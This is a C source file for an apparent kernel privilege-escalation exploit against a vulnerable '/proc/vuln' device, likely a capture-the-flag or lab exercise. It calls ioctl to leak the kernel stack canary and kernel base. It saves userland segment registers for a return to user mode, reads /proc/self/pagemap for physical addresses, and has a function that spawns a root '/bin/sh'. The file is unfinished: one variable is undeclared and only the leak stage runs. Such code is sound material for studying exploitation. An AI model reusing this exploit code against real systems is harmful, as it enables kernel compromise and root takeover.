#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdint.h>
#include <assert.h>


#if HAVE_STROPTS_H
#include <stropts.h>
#endif

#define DEVICE "/proc/vuln"

#define SET_MAX_SIZE 0x10
#define COPY_DATA 0x20
#define WRITE_DATA 0x30
#define READ_DATA 0x40

#define PAGE_SIZE 0x1000
#define TTY_STRUCT_SIZE 0x2E0
#define CRED_STRUCT_SIZE 0xA8


#define LEAK_SIZE 0x300


int dev_fd;

size_t user_cs, user_ss, user_rflags, user_sp;

unsigned long user_rip;
unsigned long canary;

void die(const char* msg){
    perror(msg);
    exit(-1);
}

void open_device(){
    dev_fd = open(DEVICE, O_RDWR);

    if (dev_fd < 0) {
        puts("[-] Failed to open device");
        die("open");
    }
    puts("[*] Opened device");
}

void shell(){
    if(!getuid()){
        system("/bin/sh");
    }
    else{
        puts("[!] Failed to Escape");
    }
}

void print_buf(unsigned long *buf, unsigned n){
    for (int i = 0; i < n; i++){
        printf("%u: %lx\n", i, buf[i]);
    }
}

uint64_t u64(uint8_t *buf)
{
    uint64_t res = 0;
    for(int i =0 ; i < 8;i++)
    {
        res = res<<8;
        res+=(uint)buf[7-i];
    }
    return res;
}

// See https://www.kernel.org/doc/Documentation/vm/pagemap.txt
uint64_t virt2phys(void* p)
{
    uint64_t virt = (uint64_t)p;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        die("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
        die("read");

    // Assert page present
    assert(phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys;
}

void set_max_size(unsigned long max){

    int res = ioctl(dev_fd, SET_MAX_SIZE, max);
    
    if (res < 0){
        puts("[-] Failed to set max size\n");
        die("ioctl");
    }

    printf("[*] Set max size to %l\n", max);

}

void leak(){
 
    //unsigned long leak[9000];

    set_max_size(10000);
    int upto = 600;
    unsigned long leak[upto];
    leak[0] = 200;
    int res = ioctl(dev_fd, READ_DATA, leak);
    
    if (res < 0){
        puts("[-] Failed to call read data ioctl\n");
        perror("ioctl");
    }

    canary = leak[22];
    IMAGE_BASE = leak[10];

    printf("[*] Leaked canary 0x%lx\n", canary);
    printf("[*] Leaked kernel base 0x%lx\n", IMAGE_BASE);
 
    print_buf((long unsigned int *)leak,50);

}


void save_status()
{
    __asm__(
            ".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;"
            );

    puts("[*] Userland status has been saved.\n");
}

int main(void){ 
    open_device();
    save_status();
    leak();

}

